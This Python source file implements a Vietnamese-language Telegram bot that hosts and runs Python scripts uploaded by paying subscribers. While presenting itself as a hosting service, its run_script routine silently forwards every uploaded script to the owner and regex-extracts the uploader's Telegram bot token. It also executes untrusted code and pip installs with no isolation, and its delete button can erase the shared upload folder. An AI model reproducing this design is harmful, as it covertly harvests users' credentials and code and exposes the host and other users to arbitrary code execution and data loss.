import telebot
import subprocess
import os
import zipfile
import tempfile
import shutil
import requests
import re
import sqlite3
from telebot import types
from datetime import datetime, timedelta
import psutil
import time

# Cấu hình cơ bản
TOKEN = os.getenv("TELEGRAM_TOKEN")
ADMIN_ID = 6379209139
ADMIN_USERNAME = 'HgAnh7'
bot = telebot.TeleBot(TOKEN)

# Thư mục và biến toàn cục
UPLOADED_FILES_DIR = 'uploaded_bots'
bot_scripts = {}
user_subscriptions = {}
user_files = {}
active_users = set()
bot_locked = False
free_mode = False

# Tạo thư mục nếu chưa tồn tại
if not os.path.exists(UPLOADED_FILES_DIR):
    os.makedirs(UPLOADED_FILES_DIR)

# Khởi tạo cơ sở dữ liệu
def init_db():
    with sqlite3.connect('bot_data.db') as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS subscriptions
                     (user_id INTEGER PRIMARY KEY, expiry TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS user_files
                     (user_id INTEGER, file_name TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS active_users
                     (user_id INTEGER PRIMARY KEY)''')
        conn.commit()

# Tải dữ liệu từ cơ sở dữ liệu
def load_data():
    with sqlite3.connect('bot_data.db') as conn:
        c = conn.cursor()
        c.execute('SELECT * FROM subscriptions')
        for user_id, expiry in c.fetchall():
            user_subscriptions[user_id] = {'expiry': datetime.fromisoformat(expiry)}
        
        c.execute('SELECT * FROM user_files')
        for user_id, file_name in c.fetchall():
            user_files.setdefault(user_id, []).append(file_name)
        
        c.execute('SELECT user_id FROM active_users')
        for user_id, in c.fetchall():
            active_users.add(user_id)

# Lưu dữ liệu vào cơ sở dữ liệu
def save_subscription(user_id, expiry):
    with sqlite3.connect('bot_data.db') as conn:
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO subscriptions (user_id, expiry) VALUES (?, ?)',
                  (user_id, expiry.isoformat()))
        conn.commit()

def remove_subscription(user_id):
    with sqlite3.connect('bot_data.db') as conn:
        c = conn.cursor()
        c.execute('DELETE FROM subscriptions WHERE user_id = ?', (user_id,))
        conn.commit()

def save_user_file(user_id, file_name):
    with sqlite3.connect('bot_data.db') as conn:
        c = conn.cursor()
        c.execute('INSERT INTO user_files (user_id, file_name) VALUES (?, ?)',
                  (user_id, file_name))
        conn.commit()

def remove_user_file(user_id, file_name):
    with sqlite3.connect('bot_data.db') as conn:
        c = conn.cursor()
        c.execute('DELETE FROM user_files WHERE user_id = ? AND file_name = ?',
                  (user_id, file_name))
        conn.commit()

def add_active_user(user_id):
    with sqlite3.connect('bot_data.db') as conn:
        c = conn.cursor()
        c.execute('INSERT OR IGNORE INTO active_users (user_id) VALUES (?)', (user_id,))
        conn.commit()

def remove_active_user(user_id):
    with sqlite3.connect('bot_data.db') as conn:
        c = conn.cursor()
        c.execute('DELETE FROM active_users WHERE user_id = ?', (user_id,))
        conn.commit()

init_db()
load_data()

# Tạo menu chính với ReplyKeyboardMarkup
def create_main_menu(user_id):
    main_menu = [
        ["📤 Tải Lên File", "⚡ Tốc Độ Bot"],
        [f"📞 Liên Hệ Chủ Sở Hữu @{ADMIN_USERNAME}"]
    ]
    if user_id == ADMIN_ID:
        main_menu.append(["💳 Quản Lý Đăng Ký", "📊 Thống Kê"])
        main_menu.append(["🔒 Khóa Bot", "🔓 Mở Khóa Bot"])
        main_menu.append(["🔓 Chế Độ Miễn Phí", "📢 Phát Tin Nhắn"])
    main_menu.append(["🔙 Thoát"])
    return types.ReplyKeyboardMarkup(main_menu, resize_keyboard=True)

# Tạo menu con cho Quản Lý Đăng Ký
def create_subscription_menu():
    subscription_menu = [
        ["➕ Thêm Đăng Ký", "➖ Xóa Đăng Ký"],
        ["🔙 Trở Về Menu Chính"]
    ]
    return types.ReplyKeyboardMarkup(subscription_menu, resize_keyboard=True)

# Xử lý lệnh /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if bot_locked:
        bot.send_message(message.chat.id, "⚠️ Bot hiện đang bị khóa. Vui lòng thử lại sau.")
        return

    user_id = message.from_user.id
    user_name = message.from_user.first_name
    user_username = message.from_user.username or "Không có"
    user_bio = bot.get_chat(user_id).bio or "Không có tiểu sử"
    
    photo_file_id = None
    try:
        photos = bot.get_user_profile_photos(user_id, limit=1)
        if photos.photos:
            photo_file_id = photos.photos[0][-1].file_id
    except:
        pass

    if user_id not in active_users:
        active_users.add(user_id)
        add_active_user(user_id)
        
        admin_msg = (f"🎉 Người dùng mới tham gia!\n\n"
                     f"👤 Tên: {user_name}\n"
                     f"📌 Tên người dùng: @{user_username}\n"
                     f"🆔 ID: {user_id}\n"
                     f"📝 Tiểu sử: {user_bio}")
        
        if photo_file_id:
            bot.send_photo(ADMIN_ID, photo_file_id, caption=admin_msg)
        else:
            bot.send_message(ADMIN_ID, admin_msg)

    welcome_msg = (f"〽️ Chào mừng: {user_name}\n"
                   f"🆔 ID của bạn: {user_id}\n"
                   f"♻️ Tên người dùng: @{user_username}\n"
                   f"📰 Tiểu sử: {user_bio}\n\n"
                   f"〽️ Tôi là bot lưu trữ file Python 🎗 Sử dụng các nút bên dưới để điều khiển ♻️")
    
    if photo_file_id:
        bot.send_photo(message.chat.id, photo_file_id, caption=welcome_msg, reply_markup=create_main_menu(user_id))
    else:
        bot.send_message(message.chat.id, welcome_msg, reply_markup=create_main_menu(user_id))

# Xử lý tin nhắn văn bản
@bot.message_handler(content_types=['text'])
def handle_text(message):
    global bot_locked, free_mode
    user_id = message.from_user.id
    text = message.text

    if text == '📤 Tải Lên File':
        if bot_locked:
            bot.send_message(user_id, f"⚠️ Bot hiện đang bị khóa. Liên hệ chủ sở hữu @{ADMIN_USERNAME}.")
        elif free_mode or (user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now()):
            bot.send_message(user_id, "📄 Vui lòng gửi file bạn muốn tải lên.")
        else:
            bot.send_message(user_id, f"⚠️ Bạn cần đăng ký để sử dụng tính năng này. Liên hệ chủ sở hữu @{ADMIN_USERNAME}.")
    
    elif text == '⚡ Tốc Độ Bot':
        try:
            start_time = time.time()
            response = requests.get(f'https://api.telegram.org/bot{TOKEN}/getMe')
            latency = time.time() - start_time
            bot.send_message(user_id, f"⚡ Tốc độ bot: {latency:.2f} giây." if response.ok else "⚠️ Không thể kiểm tra tốc độ bot.")
        except Exception as e:
            bot.send_message(user_id, f"❌ Lỗi khi kiểm tra tốc độ: {e}")
    
    elif text == f'📞 Liên Hệ Chủ Sở Hữu @{ADMIN_USERNAME}':
        bot.send_message(user_id, f"📞 Vui lòng liên hệ chủ sở hữu qua @{ADMIN_USERNAME}")
    
    elif text == '💳 Quản Lý Đăng Ký' and user_id == ADMIN_ID:
        bot.send_message(user_id, "Chọn hành động:", reply_markup=create_subscription_menu())
    
    elif text == '📊 Thống Kê' and user_id == ADMIN_ID:
        total_files = sum(len(files) for files in user_files.values())
        total_users = len(user_files)
        active_users_count = len(active_users)
        bot.send_message(user_id, f"📊 Thống kê:\n\n📂 File đã tải lên: {total_files}\n👤 Tổng người dùng: {total_users}\n👥 Người dùng hoạt động: {active_users_count}")
    
    elif text == '🔒 Khóa Bot' and user_id == ADMIN_ID:
        bot_locked = True
        bot.send_message(user_id, "🔒 Bot đã bị khóa.")
    
    elif text == '🔓 Mở Khóa Bot' and user_id == ADMIN_ID:
        bot_locked = False
        bot.send_message(user_id, "🔓 Bot đã được mở khóa.")
    
    elif text == '🔓 Chế Độ Miễn Phí' and user_id == ADMIN_ID:
        free_mode = not free_mode
        status = "mở" if free_mode else "đóng"
        bot.send_message(user_id, f"🔓 Chế độ miễn phí hiện: {status}.")
    
    elif text == '📢 Phát Tin Nhắn' and user_id == ADMIN_ID:
        bot.send_message(user_id, "Gửi tin nhắn bạn muốn phát:")
        bot.register_next_step_handler(message, process_broadcast_message)
    
    elif text == '➕ Thêm Đăng Ký' and user_id == ADMIN_ID:
        bot.send_message(user_id, "Gửi ID người dùng và số ngày theo định dạng:\n/add_subscription <user_id> <days>")
    
    elif text == '➖ Xóa Đăng Ký' and user_id == ADMIN_ID:
        bot.send_message(user_id, "Gửi ID người dùng theo định dạng:\n/remove_subscription <user_id>")
    
    elif text == '🔙 Trở Về Menu Chính':
        bot.send_message(user_id, "Quay lại menu chính.", reply_markup=create_main_menu(user_id))
    
    elif text == '🔙 Thoát':
        bot.send_message(user_id, "👋 Tạm biệt bạn, hẹn gặp lại!", reply_markup=types.ReplyKeyboardMarkup([], resize_keyboard=True))
    
    else:
        bot.send_message(user_id, "ℹ️ Vui lòng chọn lệnh từ menu dưới đây!", reply_markup=create_main_menu(user_id))

# Xử lý phát tin nhắn
def process_broadcast_message(message):
    if message.from_user.id == ADMIN_ID:
        success_count = 0
        fail_count = 0
        for user_id in active_users:
            try:
                bot.send_message(user_id, message.text)
                success_count += 1
            except:
                fail_count += 1
        bot.send_message(message.chat.id, f"✅ Đã gửi tin nhắn đến {success_count} người dùng.\n❌ Không gửi được đến {fail_count} người dùng.")
    else:
        bot.send_message(message.chat.id, "⚠️ Bạn không phải là chủ sở hữu.")

# Xử lý lệnh quản trị
@bot.message_handler(commands=['add_subscription'])
def add_subscription(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id, days = map(int, message.text.split()[1:3])
            expiry_date = datetime.now() + timedelta(days=days)
            user_subscriptions[user_id] = {'expiry': expiry_date}
            save_subscription(user_id, expiry_date)
            bot.send_message(message.chat.id, f"✅ Đã thêm đăng ký {days} ngày cho người dùng {user_id}.")
            bot.send_message(user_id, f"🎉 Đăng ký của bạn đã được kích hoạt trong {days} ngày!")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Lỗi: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ Bạn không phải là chủ sở hữu.")

@bot.message_handler(commands=['remove_subscription'])
def remove_subscription_cmd(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            if user_id in user_subscriptions:
                del user_subscriptions[user_id]
                remove_subscription(user_id)
                bot.send_message(message.chat.id, f"✅ Đã xóa đăng ký của người dùng {user_id}.")
                bot.send_message(user_id, "⚠️ Đăng ký của bạn đã bị xóa. Bạn không thể sử dụng bot nữa.")
            else:
                bot.send_message(message.chat.id, f"⚠️ Người dùng {user_id} không có đăng ký.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Lỗi: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ Bạn không phải là chủ sở hữu.")

@bot.message_handler(commands=['user_files'])
def show_user_files(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            files_list = "\n".join(user_files.get(user_id, [])) or "⚠️ Người dùng chưa tải file nào."
            bot.send_message(message.chat.id, f"📂 File của người dùng {user_id}:\n{files_list}")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Lỗi: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ Bạn không phải là chủ sở hữu.")

@bot.message_handler(commands=['delete_user_file'])
def delete_user_file(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            file_name = message.text.split()[2]
            if user_id in user_files and file_name in user_files[user_id]:
                file_path = os.path.join(UPLOADED_FILES_DIR, file_name)
                if os.path.exists(file_path):
                    os.remove(file_path)
                    user_files[user_id].remove(file_name)
                    remove_user_file(user_id, file_name)
                    bot.send_message(message.chat.id, f"✅ Đã xóa file {file_name} của người dùng {user_id}.")
                else:
                    bot.send_message(message.chat.id, f"⚠️ File {file_name} không tồn tại.")
            else:
                bot.send_message(message.chat.id, f"⚠️ Người dùng {user_id} chưa tải file {file_name}.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Lỗi: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ Bạn không phải là chủ sở hữu.")

@bot.message_handler(commands=['stop_user_bot'])
def stop_user_bot(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            file_name = message.text.split()[2]
            if user_id in user_files and file_name in user_files[user_id]:
                for chat_id, script_info in bot_scripts.items():
                    if script_info.get('folder_path', '').endswith(file_name.split('.')[0]):
                        kill_process_tree(script_info['process'])
                        bot.send_message(chat_id, f"🔴 Đã dừng bot {file_name}.")
                        bot.send_message(message.chat.id, f"✅ Đã dừng bot {file_name} của người dùng {user_id}.")
                        break
                else:
                    bot.send_message(message.chat.id, f"⚠️ Bot {file_name} không chạy.")
            else:
                bot.send_message(message.chat.id, f"⚠️ Người dùng {user_id} chưa tải file {file_name}.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Lỗi: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ Bạn không phải là chủ sở hữu.")

# Xử lý file được tải lên
@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    if bot_locked:
        bot.reply_to(message, f"⚠️ Bot hiện đang bị khóa. Liên hệ chủ sở hữu @{ADMIN_USERNAME}")
        return
    if free_mode or (user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now()):
        try:
            file_id = message.document.file_id
            file_info = bot.get_file(file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            file_name = message.document.file_name

            if not file_name.endswith(('.py', '.zip')):
                bot.reply_to(message, "⚠️ Bot chỉ chấp nhận file Python (.py) hoặc file nén (.zip).")
                return

            if file_name.endswith('.zip'):
                with tempfile.TemporaryDirectory() as temp_dir:
                    zip_path = os.path.join(temp_dir, file_name)
                    with open(zip_path, 'wb') as new_file:
                        new_file.write(downloaded_file)
                    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                        zip_ref.extractall(temp_dir)

                    final_folder = os.path.join(UPLOADED_FILES_DIR, file_name.split('.')[0])
                    os.makedirs(final_folder, exist_ok=True)
                    for root, _, files in os.walk(temp_dir):
                        for file in files:
                            shutil.move(os.path.join(root, file), os.path.join(final_folder, file))

                    py_files = [f for f in os.listdir(final_folder) if f.endswith('.py')]
                    if py_files:
                        main_script = os.path.join(final_folder, py_files[0])
                        run_script(main_script, user_id, final_folder, py_files[0], message)
                    else:
                        bot.send_message(user_id, "❌ Không tìm thấy file Python (.py) trong file nén.")
                        return
            else:
                script_path = os.path.join(UPLOADED_FILES_DIR, file_name)
                with open(script_path, 'wb') as new_file:
                    new_file.write(downloaded_file)
                run_script(script_path, user_id, UPLOADED_FILES_DIR, file_name, message)

            user_files.setdefault(user_id, []).append(file_name)
            save_user_file(user_id, file_name)
        except Exception as e:
            bot.reply_to(message, f"❌ Lỗi: {e}")
    else:
        bot.reply_to(message, f"⚠️ Bạn cần đăng ký để sử dụng tính năng này. Liên hệ chủ sở hữu @{ADMIN_USERNAME}")

# Chạy script Python
def run_script(script_path, chat_id, folder_path, file_name, message):
    try:
        requirements_path = os.path.join(os.path.dirname(script_path), 'requirements.txt')
        if os.path.exists(requirements_path):
            bot.send_message(chat_id, "🔄 Đang cài đặt các thư viện cần thiết...")
            subprocess.check_call(['pip', 'install', '-r', requirements_path])

        bot.send_message(chat_id, f"🚀 Đang chạy bot {file_name}...")
        process = subprocess.Popen(['python3', script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        bot_scripts[chat_id] = {'process': process, 'folder_path': folder_path}

        token = extract_token_from_script(script_path)
        user_info = f"@{message.from_user.username}" if message.from_user.username else str(message.from_user.id)
        caption = f"📤 Người dùng {user_info} đã tải lên bot mới."
        if token:
            try:
                bot_info = requests.get(f'https://api.telegram.org/bot{token}/getMe').json()
                caption += f" Tên bot: @{bot_info['result']['username']}"
            except:
                caption += " Không lấy được tên bot."
        
        bot.send_document(ADMIN_ID, open(script_path, 'rb'), caption=caption)
        
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(types.KeyboardButton(f"🔴 Dừng {file_name}"), types.KeyboardButton(f"🗑️ Xóa {file_name}"))
        markup.add(types.KeyboardButton('🔙 Trở Về Menu Chính'))
        bot.send_message(chat_id, "Sử dụng các nút bên dưới để điều khiển bot 👇", reply_markup=markup)
    except Exception as e:
        bot.send_message(chat_id, f"❌ Lỗi khi chạy bot: {e}")

# Trích xuất token từ script
def extract_token_from_script(script_path):
    try:
        with open(script_path, 'r') as script_file:
            token_match = re.search(r"['\"]([0-9]{9,10}:[A-Za-z0-9_-]+)['\"]", script_file.read())
            return token_match.group(1) if token_match else None
    except:
        return None

# Xử lý các lệnh điều khiển bot
@bot.message_handler(regexp=r'🔴 Dừng|🗑️ Xóa')
def handle_bot_control(message):
    user_id = message.from_user.id
    text = message.text
    if text.startswith('🔴 Dừng'):
        file_name = text.split(' ', 1)[1]
        stop_running_bot(user_id, file_name)
    elif text.startswith('🗑️ Xóa'):
        file_name = text.split(' ', 1)[1]
        delete_uploaded_file(user_id, file_name)
    bot.send_message(user_id, "Quay lại menu chính.", reply_markup=create_main_menu(user_id))

# Dừng và xóa bot
def stop_running_bot(chat_id, file_name):
    if chat_id in bot_scripts and 'process' in bot_scripts[chat_id]:
        kill_process_tree(bot_scripts[chat_id]['process'])
        bot.send_message(chat_id, f"🔴 Đã dừng bot {file_name}.")
    else:
        bot.send_message(chat_id, "⚠️ Không có bot nào đang chạy.")

def delete_uploaded_file(chat_id, file_name):
    if chat_id in bot_scripts and 'folder_path' in bot_scripts[chat_id]:
        folder_path = bot_scripts[chat_id]['folder_path']
        if os.path.exists(folder_path):
            shutil.rmtree(folder_path)
            user_files[chat_id].remove(file_name)
            remove_user_file(chat_id, file_name)
            bot.send_message(chat_id, f"🗑️ Đã xóa file bot {file_name}.")
        else:
            bot.send_message(chat_id, "⚠️ File không tồn tại.")
    else:
        bot.send_message(chat_id, "⚠️ Không có file bot để xóa.")

# Dừng tiến trình
def kill_process_tree(process):
    try:
        parent = psutil.Process(process.pid)
        for child in parent.children(recursive=True):
            child.kill()
        parent.kill()
    except:
        pass

# Bắt đầu bot
bot.infinity_polling()